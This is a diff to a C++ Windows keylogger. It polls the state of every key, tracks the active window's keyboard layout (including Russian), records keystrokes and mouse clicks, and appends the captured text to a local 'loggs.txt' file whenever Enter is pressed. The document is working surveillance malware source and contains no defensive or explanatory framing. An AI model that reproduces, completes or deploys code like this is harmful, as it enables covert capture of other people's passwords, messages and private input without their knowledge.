@@ -2,8 +2,8 @@
 
 Logger* Logger::instance = NULL;
 LANGID Logger::langId = 9;
-map <int, vector<char>> btnKeyRu = {};
-map <int, vector<char>> btnKeyEn = {};
+map <int, vector<char>> Logger::btnKeyRu = {};
+map <int, vector<char>> Logger::btnKeyEn = {};
 
 Logger::Logger() {
     if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
@@ -25,538 +25,254 @@ Logger* Logger::getInstance()
 	return instance;
 }
 
-int Logger::saveEng(int key)
-{
-    switch (key) {
-    case 96:
-        instance->simbols += "0";
-        break;
-    case 97:
-        instance->simbols += "1";
-        break;
-    case 98:
-        
-        instance->simbols += "2";
-        break;
-    case 99:
-        
-        instance->simbols += "3";
-        break;
-    case 100:
-        
-        instance->simbols += "4";
-        break;
-    case 101:
-        
-        instance->simbols += "5";
-        break;
-    case 102:
-        
-        instance->simbols += "6";
-        break;
-    case 103:
-        
-        instance->simbols += "7";
-        break;
-    case 104:
-        
-        instance->simbols += "8";
-        break;
-    case 105:
-        
-        instance->simbols += "9";
-        break;
-        // Конец. Цифровая клавиатура
-
-        //Начало. Клавиатура вверху.
-    case 48:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += ")";
-        }
-        else
-            instance->simbols += "0";
-        break;
-    case 49:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "!";
-        }
-        else
-            instance->simbols += "1";
-        break;
-    case 50:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "@";
-        }
-        else
-            instance->simbols += "2";
-        break;
-    case 51:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "#";
-        }
-        else
-            instance->simbols += "3";
-        break;
-    case 52:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "$";
-        }
-        else
-            instance->simbols += "4";
-        break;
-    case 53:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "%";
-        }
-        else
-            instance->simbols += "5";
-        break;
-    case 54:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "^";
-        }
-        else
-            instance->simbols += "6";
-        break;
-    case 55:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "&";
-        }
-        else
-            instance->simbols += "7";
-        break;
-    case 56:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "*";
-        }
-        else
-            instance->simbols += "8";
-        break;
-    case 57:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "(";
-        }
-        else
-            instance->simbols += "9";
-        break;
-        //Конец. Клавиатура вверху
-
-        //Начало. Ввод набора букв с клавиатуры.
-        //Используем таблицу символов Юников (Unicode)
-        //Например, код &#260 соответствует латинской заглавной букве А
-    case 65:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT) || (is_capslock && !GetAsyncKeyState(VK_LSHIFT) || is_capslock && GetAsyncKeyState(VK_RSHIFT))) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#260";
-            }
-            else
-                instance->simbols += "A";
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#261";
-            }
-            else
-                instance->simbols += "a";
-        }
-        break;
-    case 66:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "B";
-        }
-        else
-            instance->simbols += "b";
-        break;
-    case 67:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#262";
-            }
-            else {
-                instance->simbols += "C";
-            }
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#263";
-            }
-            else {
-                instance->simbols += "c";
-            }
-        }
-        break;
-    case 68:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "D";
-        }
-        else
-            instance->simbols += "d";
-        break;
-    case 69:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#280";
-            }
-            else {
-                instance->simbols += "E";
-            }
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#281";
-            }
-            else {
-                instance->simbols += "e";
-            }
-        }
-        break;
-    case 70:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "F";
-        }
-        else
-            instance->simbols += "f";
-        break;
-    case 71:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "G";
-        }
-        else
-            instance->simbols += "g";
-        break;
-    case 72:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "H";
-        }
-        else
-            instance->simbols += "h";
-        break;
-    case 73:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "I";
-        }
-        else
-            instance->simbols += "i";
-        break;
-    case 74:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "J";
-        }
-        else
-            instance->simbols += "j";
-        break;
-    case 75:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "K";
-        }
-        else
-            instance->simbols += "k";
-        break;
-    case 76:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#321";
-            }
-            else {
-                instance->simbols += "L";
-            }
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&322";
-            }
-            else {
-                instance->simbols += "l";
-            }
-        }
-        break;
-    case 77:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "M";
-        }
-        else
-            instance->simbols += "m";
-        break;
-    case 78:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#323";
-            }
-            else {
-                instance->simbols += "N";
-            }
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#324";
-            }
-            else {
-                instance->simbols += "n";
-            }
-        }
-        break;
-    case 79:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#211";
-            }
-            else {
-                instance->simbols += "O";
-            }
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#243";
-            }
-            else {
-                instance->simbols += "o";
-            }
-        }
-        break;
-    case 80:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "P";
-            break;
-        }
-        else
-            instance->simbols += "p";
-        break;
-    case 81:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
-        {
-            instance->simbols += "Q";
-            break;
-        }
-        else
-            instance->simbols += "q";
-
-        break;
-
-    case 82:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "R";
-            break;
-        }
-        else
-            instance->simbols += "r";
-        break;
-    case 83:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#346";
-            }
-            else {
-                instance->simbols += "S";
-            }
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#347";
-            }
-            else {
-                instance->simbols += "s";
-            }
-        }
-        break;
-    case 84:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "T";
-            break;
-        }
-        else
-            instance->simbols += "t";
-        break;
-    case 85:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "U";
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "ˆ";
-            }
-            else {
-                instance->simbols += "u";
-            }
-        }
-        break;
-    case 86:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "V";
-            break;
-        }
-        else
-            instance->simbols += "v";
-        break;
-    case 87:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "W";
-            break;
-        }
-        else
-            instance->simbols += "w";
-        break;
-    case 88:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#377";
-            }
-            else {
-                instance->simbols += "X";
-            }
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#378";
-            }
-            else {
-                instance->simbols += "x";
-            }
-        }
-        break;
-    case 89:
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            instance->simbols += "Y";
-            break;
-        }
-        else
-            instance->simbols += "y";
-        break;
-    case 90:
-
-        
-        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#379";
-            }
-            else {
-                instance->simbols += "Z";
-            }
-            break;
-        }
-        else {
-            if (GetAsyncKeyState(VK_MENU)) {
-                instance->simbols += "&#380";
-            }
-            else {
-                instance->simbols += "z";
-            }
-        }
-
-        //Начало. Ввод набора букв с клавиатуры.
-        //Десятичные коды клавиш.
-    case 13:
-        cout << this->get() << endl;
-        instance->simbols = "";
-        break;
-    case 20:
-        
-        if (is_capslock == false) {
-            is_capslock = true;
-        }
-        else {
-            is_capslock = false;
-        }
-        // TODO доработать логику капслока
-        break;
-    case VK_BACK:
-        instance->simbols = simbols.substr(0, simbols.length() - 1);
-        break;
-    case VK_SPACE:
-        
-        instance->simbols += " ";
-        break;
-    case VK_MULTIPLY:
-        
-        instance->simbols += "*";
-        break;
-    case VK_ADD:
-        
-        instance->simbols += "+";
-        break;
-    case VK_SUBTRACT:
-        
-        instance->simbols += "-";
-        break;
-    case VK_DECIMAL:
-        
-        instance->simbols += ".";
-        break;
-    case VK_DIVIDE:
-        
-        instance->simbols += "/";
-        break;
-    default:
-        break;
-    }
-    return 0;
-}
-
 void Logger::run()
 {
-    HKL lang = GetKeyboardLayout(0);
     Logger* log = Logger::getInstance();
-    langId = PRIMARYLANGID(lang); // 9 - en 25 - ru;
-    char i;
-    while (1) {
-        /*if ((GetAsyncKeyState(VK_RETURN) & 0x01) != 0) {
-            break;
-        }*/
-        // if (GetKeyboardLayout(0) == WM_INPUTLANGCHANGE) 
-        for (i = 8; i <= 190; i++) {
-            if (GetAsyncKeyState(i) == -32767) {
-                log->saveEng(i);
-            }
+    while (true) {
+        instance->saver();
+    }
+}
+
+
+void Logger::saver() {
+    unsigned char lpKeyboard[256];
+    char d;
+    instance->hwnd = GetForegroundWindow();
+    WORD rusLangId = MAKELANGID(LANG_RUSSIAN, SUBLANG_DEFAULT);
+    HKL kLayout = GetKeyboardLayout(GetWindowThreadProcessId(instance->hwnd, &instance->processId));
+    for (unsigned char c = 1; c < 255; c++) {
+        if (GetAsyncKeyState(c) & 1)
+        {
+            switch (c)
+            {
+            case VK_LBUTTON:
+                instance->simbols += "<LMOUSE>";
+                break;
+
+            case VK_RBUTTON:
+                instance->simbols += "<RMOUSE>";
+                break;
+
+            case VK_MBUTTON:
+                instance->simbols +=  "<MMOUSE>";
+                break;
+
+            case VK_RETURN:
+                instance->saveToFile();
+                break;
+
+            case VK_LCONTROL:
+            case VK_RCONTROL:
+            case VK_LMENU:
+            case VK_RMENU:
+                break;
+
+            case VK_CONTROL:
+                instance->simbols +=  "<CTRL>";
+                break;
+
+            case VK_MENU:
+                instance->simbols +=  "<ALT>";
+                break;
+
+            case VK_BACK:
+                instance->simbols +=  "<BACKSPACE>";
+                break;
+
+            case VK_TAB:
+                instance->simbols +=  "<TAB>";
+                break;
+
+            case VK_ESCAPE:
+                instance->simbols +=  "<ESC>";
+                break;
+
+            case VK_PRIOR:
+                instance->simbols +=  "<PAGE UP>";
+                break;
+
+            case VK_NEXT:
+                instance->simbols +=  "<PAGE DOWN>";
+                break;
+
+            case VK_END:
+                instance->simbols +=  "<END>";
+                break;
+
+            case VK_HOME:
+                instance->simbols +=  "<HOME>";
+                break;
+
+            case VK_LEFT:
+                instance->simbols +=  "<ARROW LEFT>";
+                break;
+
+            case VK_UP:
+                instance->simbols +=  "<ARROW UP>";
+                break;
+
+            case VK_RIGHT:
+                instance->simbols +=  "<ARROW RIGHT>";
+                break;
+
+            case VK_DOWN:
+                instance->simbols +=  "<ARROW DOWN>";
+                break;
+
+            case VK_INSERT:
+                instance->simbols +=  "<INS>";
+                break;
+
+            case VK_DELETE:
+                instance->simbols +=  "<DEL>";
+                break;
+
+            case VK_LWIN:
+            case VK_RWIN:
+                instance->simbols +=  "<WIN>";
+                break;
+
+            case VK_MULTIPLY:
+                instance->simbols +=  "<NUM *>";
+                break;
+
+            case VK_ADD:
+                instance->simbols +=  "<NUM +>";
+                break;
+
+            case VK_SUBTRACT:
+                instance->simbols +=  "<NUM ->";
+                break;
+
+            case VK_DIVIDE:
+                instance->simbols +=  "<NUM />";
+                break;
+
+            case VK_CAPITAL:
+                instance->simbols +=  "<CAPS>";
+                break;
+
+            case VK_NUMLOCK:
+                instance->simbols +=  "<NUM>";
+                break;
+
+            case VK_SCROLL:
+                instance->simbols +=  "<SCROLL>";
+                break;
+
+            case VK_SNAPSHOT:
+                instance->simbols +=  "<PRINT SCREEN>";
+                break;
+
+            case VK_PAUSE:
+                instance->simbols +=  "<PAUSE>";
+                break;
+
+            case VK_DECIMAL:
+                instance->simbols +=  "<NUM .>";
+                break;
+
+            case VK_OEM_PLUS:
+                instance->simbols +=  "+";
+                break;
+
+            case VK_OEM_COMMA:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "á";
+                else
+                    instance->simbols +=  ",";
+                break;
+
+            case VK_OEM_MINUS:
+                instance->simbols +=  "-";
+                break;
+
+            case VK_OEM_PERIOD:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "þ";
+                else
+                    instance->simbols +=  ".";
+                break;
+
+            case VK_APPS:
+                instance->simbols +=  "<APP>";
+                break;
+
+            case VK_OEM_1:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "æ";
+                else
+                    instance->simbols +=  ";";
+                break;
+
+            case VK_OEM_2:
+                instance->simbols +=  "?";
+                break;
+
+            case VK_OEM_3:
+                instance->simbols +=  "~";
+                break;
+
+            case VK_OEM_4:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "õ";
+                else
+                    instance->simbols +=  "[";
+                break;
+
+            case VK_OEM_5:
+                instance->simbols +=  "\\";
+                break;
+
+            case VK_OEM_6:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "ú";
+                else
+                    instance->simbols +=  "]";
+                break;
+
+            case VK_OEM_7:
+                if (LOWORD(kLayout) == rusLangId)
+                    instance->simbols +=  "ý";
+                else
+                    instance->simbols +=  "'";
+                break;
+
+            default:
+                if ((c >= 0x41 && c <= 0x5A) ||
+                    (c >= 0x30 && c <= 0x39) ||
+                    (c == VK_SPACE))
+                {
+                    GetKeyboardState(lpKeyboard);
+                    ToUnicodeEx(c, MapVirtualKey(c, 0), lpKeyboard, &wChar, 2, 0, kLayout);
+                    WideCharToMultiByte(CP_ACP, 0, &wChar, -1, &d, 1, NULL, NULL);
+                    short G = GetKeyState(VK_LSHIFT);
+                    if (GetAsyncKeyState(VK_RSHIFT) & 1 || GetKeyState(VK_LSHIFT) & 1) {
+                        d = toUpper(d);
+                    }
+                    instance->simbols +=  d;
+                }
+                else if (c >= VK_NUMPAD0 && c <= VK_NUMPAD9)
+                    instance->simbols += (c - 96);
+                else if (c >= VK_F1 && c <= VK_F12)
+                    instance->simbols += (c - 111);
+                break;
+            }         
         }
 
     }
 }
 
+char Logger::toUpper(char letter) {
+    return letter - 32;
+}
 
-void Logger::fillBtnKey() {
-    map<char, char> enToRu = { {'q', 'й'}, {'w', 'ц'}};
-    for (int i = 32; i <= 125; i++) {
-        btnKeyEn.insert({{i, {char(i)}}});
-        //Logger::btnKeyRu.insert(pair<int, vector<char>>(i, { enToRu.at(char(i)) }));
+
+void Logger::saveToFile() {
+    ofstream f("loggs.txt", ios::app);
+    if (f.is_open()) {
+        f << instance->simbols << endl;
     }
+    f.close();
 }
 
